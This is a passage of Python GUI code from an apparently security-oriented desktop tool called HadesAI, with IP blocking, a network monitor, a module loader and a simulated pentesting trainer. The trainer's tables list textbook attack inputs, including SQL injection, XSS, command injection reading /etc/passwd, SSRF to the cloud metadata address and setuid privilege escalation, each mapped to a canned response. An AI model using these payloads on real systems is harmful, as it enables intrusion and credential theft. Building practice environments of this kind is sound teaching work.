        widget.setLayout(layout)
        return widget
        
    def _toggle_defense_tab(self):
        """Toggle defense tab engine state"""
        if not hasattr(self, 'defense_tab_engine'):
            QMessageBox.warning(self, "Error", "Autonomous defense module not initialized")
            return
        
        if self.defense_tab_engine.enabled:
            self.defense_tab_engine.disable()
            self.defense_enable_btn.setText("Enable Defense")
            self.defense_status_label.setText("Status: Disabled")
            self.defense_status_label.setStyleSheet("color: #ff6b6b;")
        else:
            # Get selected defense level
            level_name = self.defense_tab_level_combo.currentText()
            from modules.autonomous_defense import DefenseLevel
            level = DefenseLevel[level_name]
            
            self.defense_tab_engine.enable(level)
            self.defense_enable_btn.setText("Disable Defense")
            self.defense_status_label.setText(f"Status: Enabled ({level_name})")
            self.defense_status_label.setStyleSheet("color: #51cf66;")
        
    def _block_ip_from_defense_tab(self):
        """Block an IP address from the defense tab"""
        if not hasattr(self, 'defense_tab_engine'):
            QMessageBox.warning(self, "Error", "Autonomous defense module not initialized")
            return
        
        ip = self.defense_block_input.text().strip()
        if not ip:
            QMessageBox.warning(self, "Error", "Please enter an IP address")
            return
        
        # Validate IP format
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            QMessageBox.warning(self, "Error", "Invalid IP address format")
            return
        
        try:
            self.defense_tab_engine.block_ip(ip)
            
            # Update blocked IPs display
            self._update_defense_blocked_ips_log()
            self.defense_block_input.clear()
            QMessageBox.information(self, "Success", f"IP {ip} has been blocked")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to block IP: {str(e)}")
        
    def _update_defense_blocked_ips_log(self):
        """Update the blocked IPs log from defense tab engine"""
        if not hasattr(self, 'defense_tab_engine'):
            return
        
        try:
            # Get blocked IPs from the engine
            blocked_ips = getattr(self.defense_tab_engine.rate_limiter, 'blocked_ips', set())
            if blocked_ips:
                self.defense_blocked_ips.setText('\n'.join(sorted(blocked_ips)))
            else:
                self.defense_blocked_ips.setText("No blocked IPs")
        except Exception as e:
            logger.warning(f"Failed to update blocked IPs log: {e}")

    def _create_simulations_tab(self) -> QWidget:
        """Create realistic pentesting simulations with AI guidance and learning"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Header
        header = QGroupBox("🎮 Pentesting Simulations")
        header_layout = QVBoxLayout(header)
        header_layout.addWidget(QLabel("Practice your pentesting skills in safe, simulated environments."))
        layout.addWidget(header)
        
        # Splitter for scenario list and details
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Left side - Available Scenarios
        scenarios_group = QGroupBox("📋 Available Scenarios")
        scenarios_layout = QVBoxLayout(scenarios_group)
        self.scenarios_list = QListWidget()
        self.scenarios_list.itemSelectionChanged.connect(self._on_scenario_selected)
        
        # Populate scenarios
        scenarios_data = [
            ("🔓 SQL Injection (Easy)", "SQL Injection", "Practice basic SQL injection techniques"),
            ("🕸️ XSS Attack (Easy)", "XSS", "Learn about Cross-Site Scripting vulnerabilities"),
            ("🔐 Authentication Bypass (Medium)", "Auth Bypass", "Bypass weak authentication mechanisms"),
            ("💉 Command Injection (Medium)", "Command Injection", "Execute arbitrary commands on the target"),
            ("🎭 SSRF Attack (Medium)", "SSRF", "Server-Side Request Forgery exploitation"),
            ("🏗️ Web App Pentesting (Hard)", "Web App", "Full web application penetration test"),
            ("🌐 Network Enumeration (Medium)", "Enumeration", "Discover hosts and services on a network"),
            ("🔑 Privilege Escalation (Hard)", "Privesc", "Escalate privileges to gain admin access"),
        ]
        
        self.scenarios = {}
        for display_name, scenario_id, description in scenarios_data:
            item = QListWidgetItem(display_name)
            item.setData(Qt.ItemDataRole.UserRole, scenario_id)
            self.scenarios_list.addItem(item)
            self.scenarios[scenario_id] = {
                'name': display_name,
                'description': description,
                'difficulty': 'Easy' if 'Easy' in display_name else 'Medium' if 'Medium' in display_name else 'Hard'
            }
        
        scenarios_layout.addWidget(self.scenarios_list)
        
        # Scenario controls
        ctrl_layout = QHBoxLayout()
        start_btn = QPushButton("▶️ Start Scenario")
        start_btn.clicked.connect(self._start_simulation)
        reset_btn = QPushButton("🔄 Reset")
        reset_btn.clicked.connect(self._reset_simulation)
        ctrl_layout.addWidget(start_btn)
        ctrl_layout.addWidget(reset_btn)
        scenarios_layout.addLayout(ctrl_layout)
        
        splitter.addWidget(scenarios_group)
        
        # Right side - Scenario Details
        details_group = QGroupBox("📝 Scenario Details")
        details_layout = QVBoxLayout(details_group)
        
        # Difficulty badge
        difficulty_layout = QHBoxLayout()
        difficulty_layout.addWidget(QLabel("Difficulty:"))
        self.difficulty_label = QLabel("—")
        self.difficulty_label.setStyleSheet("color: #e94560; font-weight: bold;")
        difficulty_layout.addWidget(self.difficulty_label)
        difficulty_layout.addStretch()
        details_layout.addLayout(difficulty_layout)
        
        # Description
        details_layout.addWidget(QLabel("Description:"))
        self.scenario_description = QTextEdit()
        self.scenario_description.setReadOnly(True)
        self.scenario_description.setMaximumHeight(100)
        details_layout.addWidget(self.scenario_description)
        
        # Objectives
        details_layout.addWidget(QLabel("Objectives:"))
        self.scenario_objectives = QTextEdit()
        self.scenario_objectives.setReadOnly(True)
        self.scenario_objectives.setMaximumHeight(150)
        details_layout.addWidget(self.scenario_objectives)
        
        # Hints section
        details_layout.addWidget(QLabel("Hints (Click to reveal):"))
        self.hints_list = QListWidget()
        self.hints_list.itemClicked.connect(self._reveal_hint)
        self.hints_list.setMaximumHeight(120)
        details_layout.addWidget(self.hints_list)
        
        details_layout.addStretch()
        splitter.addWidget(details_group)
        
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 1)
        layout.addWidget(splitter)
        
        # Simulation environment
        sim_group = QGroupBox("🖥️ Simulation Environment")
        sim_layout = QVBoxLayout(sim_group)
        
        # Target info
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel("Target URL:"))
        self.target_url_input = QLineEdit()
        self.target_url_input.setReadOnly(True)
        self.target_url_input.setPlaceholderText("http://vulnerable-app.local")
        target_layout.addWidget(self.target_url_input)
        sim_layout.addLayout(target_layout)
        
        # Command/Payload input
        sim_layout.addWidget(QLabel("Test Payload:"))
        self.payload_input = QPlainTextEdit()
        self.payload_input.setPlaceholderText("Enter your exploit payload or SQL injection here...")
        self.payload_input.setMaximumHeight(100)
        sim_layout.addWidget(self.payload_input)
        
        # Execute button
        exec_btn = QPushButton("🚀 Execute Payload")
        exec_btn.clicked.connect(self._execute_payload)
        sim_layout.addWidget(exec_btn)
        
        # Results
        sim_layout.addWidget(QLabel("📊 Results:"))
        self.simulation_output = QTextEdit()
        self.simulation_output.setReadOnly(True)
        self.simulation_output.setFont(QFont("Consolas", 9))
        sim_layout.addWidget(self.simulation_output)
        
        # Score tracking
        score_layout = QHBoxLayout()
        score_layout.addWidget(QLabel("Score: "))
        self.score_label = QLabel("0/100")
        self.score_label.setStyleSheet("color: #00fff2; font-weight: bold; font-size: 14px;")
        score_layout.addWidget(self.score_label)
        score_layout.addWidget(QLabel("  |  Status: "))
        self.status_label = QLabel("Not Started")
        self.status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        score_layout.addWidget(self.status_label)
        score_layout.addStretch()
        sim_layout.addLayout(score_layout)
        
        layout.addWidget(sim_group)
        
        # Initialize state
        self.current_scenario = None
        self.simulation_running = False
        
        return widget
    
    def _on_scenario_selected(self):
        """Handle scenario selection"""
        current_item = self.scenarios_list.currentItem()
        if not current_item:
            return
        
        scenario_id = current_item.data(Qt.ItemDataRole.UserRole)
        scenario = self.scenarios.get(scenario_id)
        
        if scenario:
            self.difficulty_label.setText(scenario['difficulty'])
            self.scenario_description.setText(scenario['description'])
            
            # Set objectives based on scenario type
            objectives_map = {
                'SQL Injection': 'Bypass login form using SQL injection.\nExtract user credentials from the database.',
                'XSS': 'Inject JavaScript to steal session cookies.\nBypass content security policies.',
                'Auth Bypass': 'Gain access without valid credentials.\nExploit weak authentication logic.',
                'Command Injection': 'Execute system commands through input fields.\nAchieve remote code execution.',
                'SSRF': 'Access internal resources via server requests.\nExfiltrate metadata from internal services.',
                'Web App': 'Identify all vulnerabilities in the application.\nDocument findings and create a report.',
                'Enumeration': 'Discover all hosts and open ports.\nIdentify running services and versions.',
                'Privesc': 'Elevate privileges from user to root.\nMaintain persistence on the system.',
            }
            
            self.scenario_objectives.setText(objectives_map.get(scenario_id, "Complete the scenario objectives."))
            
            # Set hints
            hints_map = {
                'SQL Injection': ['Check login form for input validation', 'Try basic payloads like " OR "1"="1', 'Look at error messages for clues'],
                'XSS': ['Find input fields that reflect user data', 'Test with <script>alert("xss")</script>', 'Check for HTML entity encoding'],
                'Auth Bypass': ['Check for hardcoded credentials', 'Look for logic flaws in authentication', 'Try common default passwords'],
                'Command Injection': ['Look for fields that execute system commands', 'Try command separators like ; or |', 'Use output redirection to see results'],
                'SSRF': ['Identify URL input fields', 'Try localhost and internal IP addresses', 'Check for URL filtering bypass techniques'],
                'Web App': ['Start with information gathering', 'Test each input field systematically', 'Review client-side code for vulnerabilities'],
                'Enumeration': ['Use tools like nmap for port scanning', 'Check common ports (22, 80, 443)', 'Identify service versions for known exploits'],
                'Privesc': ['Look for SUID binaries', 'Check for weak file permissions', 'Search for sudo misconfigurations'],
            }
            
            self.hints_list.clear()
            for hint in hints_map.get(scenario_id, ['Start the scenario to get hints']):
                self.hints_list.addItem(QListWidgetItem(f"💡 {hint}"))
            
            self.current_scenario = scenario_id
            self.target_url_input.setText("http://vulnerable-app.local/scenario/" + scenario_id.lower())
    
    def _reveal_hint(self, item):
        """Reveal a hint"""
        hint_text = item.text().replace("💡 ", "")
        self._add_chat_message("system", f"💡 Hint: {hint_text}")
    
    def _start_simulation(self):
        """Start a simulation scenario"""
        if not self.current_scenario:
            self._add_chat_message("system", "❌ Please select a scenario first")
            return
        
        self.simulation_running = True
        self.simulation_output.clear()
        self.payload_input.clear()
        self.score_label.setText("0/100")
        self.status_label.setText("In Progress")
        self.status_label.setStyleSheet("color: #00fff2; font-weight: bold;")
        
        scenario = self.scenarios[self.current_scenario]
        output = f"""🎮 SIMULATION STARTED
    ═══════════════════════════════════════
    Scenario: {scenario['name']}
    Difficulty: {scenario['difficulty']}
    Target: {self.target_url_input.text()}
    ═══════════════════════════════════════

    Enter your payloads in the test field and click "Execute Payload" to simulate your attack.
    This is a safe, sandboxed environment for learning and practice.

    Tips:
    • Read all available hints carefully
    • Test your assumptions methodically
    • Document what you find
    • Think about why vulnerabilities exist

    Good luck! 🚀
    """
        self.simulation_output.setText(output)
    
    def _reset_simulation(self):
        """Reset the simulation"""
        self.simulation_running = False
        self.simulation_output.clear()
        self.payload_input.clear()
        self.score_label.setText("0/100")
        self.status_label.setText("Not Started")
        self.status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
    
    def _execute_payload(self):
        """Execute a payload against the simulation target"""
        if not self.simulation_running:
            self._add_chat_message("system", "❌ Start a simulation first")
            return
        
        payload = self.payload_input.toPlainText().strip()
        if not payload:
            self._add_chat_message("system", "❌ Enter a payload first")
            return
        
        # Simulate payload execution based on scenario type
        scenario_id = self.current_scenario
        response = self._simulate_payload_response(scenario_id, payload)
        
        current_output = self.simulation_output.toPlainText()
        self.simulation_output.setText(current_output + f"\n\n$ {payload}\n{response}")
        
        # Update score
        self._update_simulation_score(scenario_id, payload, response)
        
        # Clear input for next attempt
        self.payload_input.clear()
    
    def _simulate_payload_response(self, scenario_id: str, payload: str) -> str:
        """Simulate target response to a payload"""
        responses = {
            'SQL Injection': {
                "admin'--": "✓ Login successful! Admin access granted.",
                "' OR '1'='1": "✓ Login successful! Admin access granted.",
                "' OR 1=1--": "✓ Login successful! Admin access granted.",
                "UNION SELECT": "Retrieving user database... Users found: admin, user1, user2",
                "default": "❌ Login failed. Invalid credentials."
            },
            'XSS': {
                "<script>alert('xss')</script>": "✓ XSS Payload Executed! Session cookie stolen: sess_12345abcde",
                "<img src=x onerror=alert('xss')>": "✓ XSS Payload Executed! Session cookie stolen: sess_12345abcde",
                "javascript:alert('xss')": "⚠️  Payload blocked by CSP, but technique documented.",
                "default": "❌ Payload blocked or not reflected."
            },
            'Auth Bypass': {
                "admin": "⚠️  Username found, needs password",
                "admin:admin": "✓ Authentication Bypassed! Access granted.",
                "admin:password": "✓ Authentication Bypassed! Access granted.",
                "root:root": "✓ Authentication Bypassed! Root access granted.",
                "default": "❌ Invalid credentials."
            },
            'Command Injection': {
                "id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
                "; cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data...",
                "| whoami": "www-data",
                "$(id)": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
                "default": "❌ Command not executed."
            },
            'SSRF': {
                "http://localhost:8080": "✓ Internal service discovered: Admin Dashboard (localhost:8080)",
                "http://169.254.169.254": "✓ AWS Metadata Service accessed: Found API keys and credentials",
                "http://internal.service": "✓ Internal service found: Database server responding",
                "file:///etc/passwd": "⚠️  File protocol detected but blocked",
                "default": "❌ URL rejected or not accessible."
            },
            'Web App': {
                "test": "✓ Found 1 vulnerability",
                "admin": "✓ Found 2 vulnerabilities",
                "'; DROP TABLE": "⚓ SQL Injection confirmed",
                "<script>": "⚓ XSS confirmed",
                "default": "Performing analysis..."
            },
            'Enumeration': {
                "22": "✓ SSH (OpenSSH 7.4)",
                "80": "✓ HTTP (Apache 2.4.6)",
                "443": "✓ HTTPS (Apache 2.4.6)",
                "3306": "✓ MySQL (5.7.32)",
                "default": "❌ Port closed or filtered."
            },
            'Privesc': {
                "sudo -l": "User may run the following commands without password: /usr/bin/python3",
                "find / -perm -4000": "✓ Found SUID binaries: /usr/bin/find, /usr/bin/chmod",
                "cat /etc/sudoers": "✓ Sudoers configuration accessed!",
                "chmod +s /bin/bash": "✓ Privilege escalation successful!",
                "default": "Permission denied."
            }
        }
        
        scenario_responses = responses.get(scenario_id, {})
        # Check if payload exactly matches a key
        if payload in scenario_responses:
            return scenario_responses[payload]
        # Check if payload contains keywords
        for key, response in scenario_responses.items():
            if key != 'default' and key.lower() in payload.lower():
                return response
        # Return default response
        return scenario_responses.get('default', "❌ No response from target.")
    
    def _update_simulation_score(self, scenario_id: str, payload: str, response: str):
        """Update the simulation score based on progress"""
        current_score = int(self.score_label.text().split('/')[0])
        
        # Check for success indicators
        if '✓' in response:
            new_score = min(100, current_score + 20)
        elif '⚓' in response:
            new_score = min(100, current_score + 15)
        elif '⚠️' in response:
            new_score = min(100, current_score + 10)
        else:
            new_score = current_score + 1
        
        self.score_label.setText(f"{new_score}/100")
        
        # Update status
        if new_score >= 80:
            self.status_label.setText("✅ Completed!")
            self.status_label.setStyleSheet("color: #4CAF50; font-weight: bold;")
        elif new_score >= 50:
            self.status_label.setText("⏳ Making Progress...")
            self.status_label.setStyleSheet("color: #00fff2; font-weight: bold;")

    def _create_modules_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Splitter for available and loaded modules
        splitter = QSplitter(Qt.Orientation.Horizontal)

        # Left side - Available Modules
        available_group = QGroupBox("🧩 Available Modules")
        available_layout = QVBoxLayout(available_group)
        self.module_list = QListWidget()
        self.module_list.setSelectionMode(QListWidget.SelectionMode.SingleSelection)
        available_layout.addWidget(self.module_list)

        # Load and Execute Buttons
        btn_layout = QHBoxLayout()
        self.load_btn = QPushButton("📥 Load Module")
        self.load_btn.clicked.connect(self._load_selected_module)
        btn_layout.addWidget(self.load_btn)

        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.clicked.connect(self._refresh_module_list)
        btn_layout.addWidget(refresh_btn)

        available_layout.addLayout(btn_layout)
        splitter.addWidget(available_group)

        # Right side - Loaded Modules
        loaded_group = QGroupBox("✅ Loaded Modules")
        loaded_layout = QVBoxLayout(loaded_group)
        self.loaded_modules_list = QListWidget()
        self.loaded_modules_list.setSelectionMode(QListWidget.SelectionMode.SingleSelection)
        loaded_layout.addWidget(self.loaded_modules_list)

        exec_layout = QHBoxLayout()
        self.exec_btn = QPushButton("▶ Execute Module")
        self.exec_btn.clicked.connect(self._execute_selected_module)
        self.exec_btn.setEnabled(False)
        exec_layout.addWidget(self.exec_btn)

        unload_btn = QPushButton("❌ Unload Module")
        unload_btn.clicked.connect(self._unload_selected_module)
        exec_layout.addWidget(unload_btn)

        loaded_layout.addLayout(exec_layout)
        splitter.addWidget(loaded_group)

        layout.addWidget(splitter)

        # Output Log
        layout.addWidget(QLabel("🧾 Module Output:"))
        self.module_output = QTextEdit()
        self.module_output.setReadOnly(True)
        self.module_output.setFont(QFont("Consolas", 10))
        layout.addWidget(self.module_output)

        self._refresh_module_list()
        self._refresh_loaded_modules_list()

        return widget
    def _start_network_monitor(self):
        if self.network_monitor and self.network_monitor.isRunning():
            return
            
        self.network_monitor = NetworkMonitor(self.ai.kb)
        self.network_monitor.connection_detected.connect(self._on_connection_detected)
        self.network_monitor.threat_detected.connect(self._on_threat_detected)
        self.network_monitor.status_update.connect(self._on_monitor_status)
        self.network_monitor.stats_update.connect(self._on_stats_update)
        
        self.network_monitor.set_defense_mode(self.defense_mode_check.isChecked())
        self.network_monitor.set_learning_mode(self.learning_mode_check.isChecked())
        
        # Initialize Autonomous Defense Engine
        if HAS_AUTONOMOUS_DEFENSE and self.autonomous_defense_check.isChecked():
            self._init_autonomous_defense()
        
        self.network_monitor.start()
        
        self.monitor_start_btn.setEnabled(False)
        self.monitor_stop_btn.setEnabled(True)
        self._add_chat_message("system", "🛡️ Network Monitor ACTIVATED - Watching for threats...")
        
    def _stop_network_monitor(self):
        if self.network_monitor:
            self.network_monitor.stop()
            self.network_monitor.wait()
        
        # Stop Autonomous Defense
        if self.autonomous_defense:
            self.autonomous_defense.disable()
            self.autonomous_defense = None
            
        self.monitor_start_btn.setEnabled(True)
        self.monitor_stop_btn.setEnabled(False)
        self.net_status_label.setText("🔴 Network Monitor STOPPED")
        self._add_chat_message("system", "🔴 Network Monitor stopped")
    
    def _init_autonomous_defense(self):
        """Initialize the autonomous defense engine"""
        if not HAS_AUTONOMOUS_DEFENSE:
            self._add_chat_message("system", "⚠️ Autonomous defense module not available")
            return
        
        try:
            self.autonomous_defense = integrate_with_network_monitor(
                self.network_monitor, 
                self.ai.kb
            )
            
            # Set defense level from combo
            level_map = {
                0: DefenseLevel.PASSIVE,
                1: DefenseLevel.REACTIVE,
                2: DefenseLevel.PROACTIVE,
                3: DefenseLevel.AGGRESSIVE
            }
            defense_level = level_map.get(self.defense_level_combo.currentIndex(), DefenseLevel.REACTIVE)
            
            # Set callbacks
            self.autonomous_defense.on_action_taken = self._on_defense_action
            self.autonomous_defense.on_threat_mitigated = self._on_threat_mitigated
            
            self.autonomous_defense.enable(defense_level)
            
            level_name = defense_level.name
            self._add_chat_message("system", 
                f"🤖 Autonomous Defense ENABLED at {level_name} level\n"
                f"   • Honeypot deployment: {'Active' if defense_level.value >= 2 else 'Standby'}\n"
                f"   • Rate limiting: Active\n"
                f"   • Threat auto-response: Active\n"
                f"   • Deceptive responses: {'Active' if defense_level.value >= 2 else 'On-demand'}")
        except Exception as e:
            self._add_chat_message("system", f"⚠️ Failed to initialize autonomous defense: {str(e)}")
    
    def _toggle_autonomous_defense(self, enabled: bool):
        """Toggle autonomous defense on/off"""
        if not self.network_monitor or not self.network_monitor.isRunning():
            if enabled:
                self._add_chat_message("system", "ℹ️ Autonomous defense will activate when Network Monitor starts")
            return
        
        if enabled:
            self._init_autonomous_defense()
        else:
            if self.autonomous_defense:
                self.autonomous_defense.disable()
                self.autonomous_defense = None
                self._add_chat_message("system", "🤖 Autonomous Defense DISABLED")
    
    def _on_defense_level_changed(self, index: int):
        """Handle defense level change"""
        if not self.autonomous_defense or not self.autonomous_defense.enabled:
            return
        
        level_map = {
            0: DefenseLevel.PASSIVE,
            1: DefenseLevel.REACTIVE,
            2: DefenseLevel.PROACTIVE,
            3: DefenseLevel.AGGRESSIVE
        }
        new_level = level_map.get(index, DefenseLevel.REACTIVE)
        
        # Reinitialize with new level
        self.autonomous_defense.disable()
        self.autonomous_defense.enable(new_level)
        self._add_chat_message("system", f"🤖 Defense level changed to: {new_level.name}")
    
    def _on_defense_action(self, action_data: dict):
        """Handle autonomous defense action taken"""
        actions = action_data.get('actions', [])
        ip = action_data.get('ip', 'Unknown')
        threat = action_data.get('threat', 'Unknown')
        
        action_str = ', '.join(actions) if actions else 'logged'
        self.net_status_label.setText(f"🤖 AUTO-DEFENSE: {action_str} for {ip} ({threat})")
        
        # Update stats
        if 'auto_mitigated' in self.net_stats_labels:
            current = int(self.net_stats_labels['auto_mitigated'].text())
            self.net_stats_labels['auto_mitigated'].setText(str(current + 1))
    
    def _on_threat_mitigated(self, threat_data: dict, actions: list):
        """Handle threat mitigation event"""
        threat_type = threat_data.get('threat_type', 'Unknown')
        remote_ip = threat_data.get('remote_ip', 'Unknown')
        action_names = [a.value if hasattr(a, 'value') else str(a) for a in actions]
        
        msg = f"⚔️ AUTONOMOUS DEFENSE: {threat_type} from {remote_ip}\n   Actions: {', '.join(action_names)}"
        self._add_chat_message("threat", msg)
        
        # Update honeypot stats if applicable
        if self.autonomous_defense and 'honeypot_hits' in self.net_stats_labels:
            stats = self.autonomous_defense.get_stats()
            self.net_stats_labels['honeypot_hits'].setText(str(stats.get('honeypot_hits', 0)))
    def _create_web_knowledge_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)

        title = QLabel("📡 AI Knowledge From Web Ingestion")
        title.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        title.setStyleSheet("color: #e94560;")
        layout.addWidget(title)

        self.web_knowledge_display = QTextEdit()
        self.web_knowledge_display.setReadOnly(True)
        self.web_knowledge_display.setFont(QFont("Consolas", 11))
        layout.addWidget(self.web_knowledge_display)

        refresh_btn = QPushButton("🔁 Refresh Web Knowledge")
        refresh_btn.clicked.connect(self._display_recent_web_knowledge)
        layout.addWidget(refresh_btn)

        return widget
    def _refresh_module_list(self):
        from os import listdir
        from os.path import isfile, join

        module_path = "modules"
        self.module_list.clear()
        if not os.path.exists(module_path):
            os.makedirs(module_path)

        for f in listdir(module_path):
            if f.endswith(".py") and isfile(join(module_path, f)):
                self.module_list.addItem(f[:-3])  # strip .py

    def _load_selected_module(self):
        import importlib.util

        selected = self.module_list.currentItem()
        if not selected:
            self.module_output.append("[!] No module selected.")
            return
        module_name = selected.text()
        
        if module_name in loaded_modules:
            self.module_output.append(f"[!] Module '{module_name}' is already loaded.")
            return
            
        module_path = os.path.join("modules", f"{module_name}.py")

        spec = importlib.util.spec_from_file_location(module_name, module_path)
        module = importlib.util.module_from_spec(spec)
        try:
            spec.loader.exec_module(module)
            loaded_modules[module_name] = module
            self.exec_btn.setEnabled(True)
            self.module_output.append(f"[+] Module '{module_name}' loaded successfully.")
            self._refresh_loaded_modules_list()
        except Exception as e:
            self.module_output.append(f"[!] Failed to load '{module_name}': {e}")

    def _execute_selected_module(self):
        selected = self.loaded_modules_list.currentItem()
        if not selected:
            self.module_output.append("[!] No loaded module selected.")
            return
            
        module_name = selected.text()
        module = loaded_modules.get(module_name)
        
        if not module:
            self.module_output.append(f"[!] Module '{module_name}' not found in loaded modules.")
            return
            
        try:
            if hasattr(module, "main"):
                result = module.main()
                self.module_output.append(f"[✔] Executed '{module_name}': {result}")
            else:
                self.module_output.append(f"[!] Module '{module_name}' has no 'main()' method.")
        except Exception as e:
            self.module_output.append(f"[✖] Execution of '{module_name}' failed: {e}")

    def _unload_selected_module(self):
        selected = self.loaded_modules_list.currentItem()
        if not selected:
            self.module_output.append("[!] No loaded module selected.")
            return
            
        module_name = selected.text()
        if module_name in loaded_modules:
            del loaded_modules[module_name]
            self.module_output.append(f"[-] Module '{module_name}' unloaded.")
            self._refresh_loaded_modules_list()
            if not loaded_modules:
                self.exec_btn.setEnabled(False)
        else:
            self.module_output.append(f"[!] Module '{module_name}' not found.")

    def _refresh_loaded_modules_list(self):
        self.loaded_modules_list.clear()
        for module_name in loaded_modules.keys():
            self.loaded_modules_list.addItem(module_name)
        self.exec_btn.setEnabled(len(loaded_modules) > 0)
    def _toggle_defense_mode(self, enabled: bool):
        if self.network_monitor:
            self.network_monitor.set_defense_mode(enabled)
        mode = "ENABLED" if enabled else "DISABLED"
        self._add_chat_message("system", f"⚔️ Active Defense Mode {mode}")
    def _display_recent_web_knowledge(self):
        if not hasattr(self, 'web_knowledge_display'):
            return
        
        recent_patterns = self.ai.kb.fetch_recent_web_patterns(limit=5)
        if recent_patterns:
            summary = "\n\n".join(
                f"[Set {i+1}]\n" + "\n".join(
                    f"- {p.get('pattern_type', 'Unknown')}: {p.get('signature', '')}" for p in patterns
                )
                for i, patterns in enumerate(recent_patterns)
            )
        else:
            summary = "No recent web-based learning data found."

        self.web_knowledge_display.setPlainText(f"[HadesAI :: Web Knowledge]\n\n{summary}")
    def _toggle_learning_mode(self, enabled: bool):
        if self.network_monitor:
            self.network_monitor.set_learning_mode(enabled)
    def _create_autorecon_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)

        instructions = QLabel("Enter a URL below and HADES AI will autonomously analyze it for flaws.")
        instructions.setWordWrap(True)
        layout.addWidget(instructions)

        self.autorecon_url_input = QLineEdit()
        self.autorecon_url_input.setPlaceholderText("https://example.com")
        layout.addWidget(self.autorecon_url_input)

        self.autorecon_start_btn = QPushButton("Start AutoRecon")
        self.autorecon_start_btn.clicked.connect(self._start_autorecon_scan)
        layout.addWidget(self.autorecon_start_btn)

        self.autorecon_output = QTextEdit()
        self.autorecon_output.setReadOnly(True)
        self.autorecon_output.setFont(QFont("Consolas", 10))
        layout.addWidget(self.autorecon_output)

        return widget        
    def _on_connection_detected(self, conn: dict):
        row = self.connection_table.rowCount()
        if row >= 100:
            self.connection_table.removeRow(0)
            row = 99
        self.connection_table.insertRow(row)
        
        self.connection_table.setItem(row, 0, QTableWidgetItem(conn.get('timestamp', '')[-8:]))
        self.connection_table.setItem(row, 1, QTableWidgetItem(conn.get('remote_addr', 'N/A')[:25]))
        self.connection_table.setItem(row, 2, QTableWidgetItem(str(conn.get('local_port', ''))))
        self.connection_table.setItem(row, 3, QTableWidgetItem(conn.get('process', 'Unknown')[:15]))
        self.connection_table.setItem(row, 4, QTableWidgetItem(conn.get('status', '')))
        
        threat = conn.get('threat_level', 'SAFE')
        threat_item = QTableWidgetItem(threat)
        if threat == 'SAFE':
            threat_item.setForeground(QColor('#4CAF50'))
        self.connection_table.setItem(row, 5, threat_item)
        
        self.connection_table.scrollToBottom()
        
    def _on_threat_detected(self, conn: dict):
        row = self.threat_table.rowCount()
        self.threat_table.insertRow(row)
        
        self.threat_table.setItem(row, 0, QTableWidgetItem(conn.get('timestamp', '')[-8:]))
        self.threat_table.setItem(row, 1, QTableWidgetItem(conn.get('remote_ip', 'N/A')))
        self.threat_table.setItem(row, 2, QTableWidgetItem(conn.get('threat_type', 'Unknown')))
        
        level = conn.get('threat_level', 'WARNING')
        level_item = QTableWidgetItem(level)
        colors = {'CRITICAL': '#ff0000', 'HIGH': '#ff6b6b', 'WARNING': '#ffa500'}
        level_item.setForeground(QColor(colors.get(level, '#ffa500')))
        self.threat_table.setItem(row, 3, level_item)
        
        details = ', '.join(conn.get('threat_details', []))[:50]
        self.threat_table.setItem(row, 4, QTableWidgetItem(details))
        
        self.threat_table.scrollToBottom()
        
        # Also add to chat
        self._add_chat_message("threat", f"⚠️ [{level}] {conn.get('threat_type')}: {conn.get('remote_addr')} - {details}")
        
    def _on_monitor_status(self, status: str):
        self.net_status_label.setText(status)
        
    def _on_stats_update(self, stats: dict):
        for key, value in stats.items():
            if key in self.net_stats_labels:
                self.net_stats_labels[key].setText(str(value))
                
    def _manual_block_ip(self):
        ip = self.block_ip_input.text().strip()
        if ip and self.network_monitor:
            self.network_monitor.block_ip(ip)
            self.block_ip_input.clear()
            self._add_chat_message("system", f"🚫 Manually blocked IP: {ip}")
            
    def _manual_unblock_ip(self):
        ip = self.block_ip_input.text().strip()
        if ip and self.network_monitor:
            self.network_monitor.unblock_ip(ip)
            self.block_ip_input.clear()
            self._add_chat_message("system", f"✅ Unblocked IP: {ip}")
            
    def _clear_threat_log(self):
        self.threat_table.setRowCount(0)
        if self.network_monitor:
            self.network_monitor.threat_log.clear()
        self._add_chat_message("system", "🗑️ Threat log cleared")
        
    def _create_tools_tab(self) -> QWidget:
        widget = QWidget()
        layout = QHBoxLayout(widget)
        
        left = QGroupBox("Tool Selection")
        left_layout = QVBoxLayout(left)
        
        left_layout.addWidget(QLabel("Target:"))
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("IP, domain, or URL...")
        left_layout.addWidget(self.target_input)
        
        left_layout.addWidget(QLabel("Tool:"))
        self.tool_combo = QComboBox()
        self.tool_combo.addItems(['Port Scan', 'Directory Bruteforce', 'Subdomain Enum', 'Banner Grab', 'Vulnerability Scan', 'Learn from URL'])
        left_layout.addWidget(self.tool_combo)
        
        self.run_tool_btn = QPushButton("▶ Run Tool")
        self.run_tool_btn.clicked.connect(self._run_tool)
        left_layout.addWidget(self.run_tool_btn)
        
        self.stop_tool_btn = QPushButton("⏹ Stop")
        self.stop_tool_btn.setEnabled(False)
        self.stop_tool_btn.clicked.connect(self._stop_tool)
        left_layout.addWidget(self.stop_tool_btn)
        
        self.tool_progress = QProgressBar()
        left_layout.addWidget(self.tool_progress)
        
        left_layout.addStretch()
        layout.addWidget(left, 1)
        
        right = QGroupBox("Output")
        right_layout = QVBoxLayout(right)
        self.tool_output = QPlainTextEdit()
        self.tool_output.setReadOnly(True)
        self.tool_output.setFont(QFont("Consolas", 10))
        right_layout.addWidget(self.tool_output)
        
        self.findings_table = QTableWidget()
        self.findings_table.setColumnCount(3)
